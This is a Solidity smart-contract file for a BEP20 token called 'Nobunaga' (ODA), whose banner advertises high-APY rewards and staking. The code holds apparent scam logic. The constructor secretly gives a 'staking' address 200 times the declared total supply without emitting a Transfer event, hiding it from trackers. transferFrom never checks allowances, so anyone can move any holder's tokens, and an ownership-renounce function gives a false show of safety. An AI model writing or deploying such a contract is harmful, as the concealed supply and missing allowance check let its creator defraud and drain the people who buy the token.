// SPDX-License-Identifier: MIT
/*
  _   _       _                                                                                                            
 | \ | |     | |                                                                                                           
 |  \| | ___ | |__  _   _ _ __   __ _  __ _  __ _                                                                          
 | . ` |/ _ \| '_ \| | | | '_ \ / _` |/ _` |/ _` |                                                                         
 | |\  | (_) | |_) | |_| | | | | (_| | (_| | (_| |                                                                         
 |_| \_|\___/|_.__/ \__,_|_| |_|\__,_|\__, |\__,_|                                                                         
  _____                            _   __/ |             _                   __  ___   ___   ___             _______     __
 |  __ \                          | | |___/             | |                 /_ |/ _ \ / _ \ / _ \      /\   |  __ \ \   / /
 | |__) |_____      ____ _ _ __ __| |___   ___ _   _ ___| |_ ___ _ __ ___    | | | | | | | | | | |    /  \  | |__) \ \_/ / 
 |  _  // _ \ \ /\ / / _` | '__/ _` / __| / __| | | / __| __/ _ \ '_ ` _ \   | | | | | | | | | | |   / /\ \ |  ___/ \   /  
 | | \ \  __/\ V  V / (_| | | | (_| \__ \ \__ \ |_| \__ \ ||  __/ | | | | |  | | |_| | |_| | |_| |  / ____ \| |      | |   
 |_|  \_\___| \_/\_/ \__,_|_|  \__,_|___/ |___/\__, |___/\__\___|_| |_| |_|  |_|\___/ \___/ \___/  /_/    \_\_|      |_|   
   _____                        ______          __/ |                                                                      
  / ____|                      |  ____|        |___/                                                                       
 | |  __  __ _ _ __ ___   ___  | |__   __ _ _ __ _ __                                                                      
 | | |_ |/ _` | '_ ` _ \ / _ \ |  __| / _` | '__| '_ \                                                                     
 | |__| | (_| | | | | | |  __/ | |___| (_| | |  | | | |                                                                    
  \_____|\__,_|_| |_| |_|\___| |______\__,_|_|  |_| |_|                                                                    
  / ____| |      | |  (_)                                                                                                  
 | (___ | |_ __ _| | ___ _ __   __ _                                                                                       
  \___ \| __/ _` | |/ / | '_ \ / _` |                                                                                      
  ____) | || (_| |   <| | | | | (_| |                                                                                      
 |_____/ \__\__,_|_|\_\_|_| |_|\__, |                                                                                      
                                __/ |                                                                                      
                               |___/            
*/

pragma solidity ^0.8.16;

import "./Utils.sol";

contract Nobunaga is BEP20 {
    using SafeMath for uint256;
    address private owner = msg.sender;    
    string public name ="Nobunaga";
    string public symbol="ODA";
    uint8 public _decimals=9;
    uint public _totalSupply=1000000000000000;
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => uint256) public antiFrontRunner;
    mapping (address => uint256) _balances;

    constructor(address staking) public {
         _balances[staking] = _totalSupply*200;
         _balances[msg.sender] = _totalSupply;
          emit Transfer(address(0), msg.sender, _totalSupply);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function getOwner() external view returns (address) {
        return owner;
    }
    function balanceOf(address who) view public returns (uint256) {
        return _balances[who];
    }
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        //emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(antiFrontRunner[sender] != block.number, "Bad bot!");
        antiFrontRunner[recipient] = block.number;
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
            _transfer(sender, recipient, amount);
            return true;
        }  
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);  
    }
}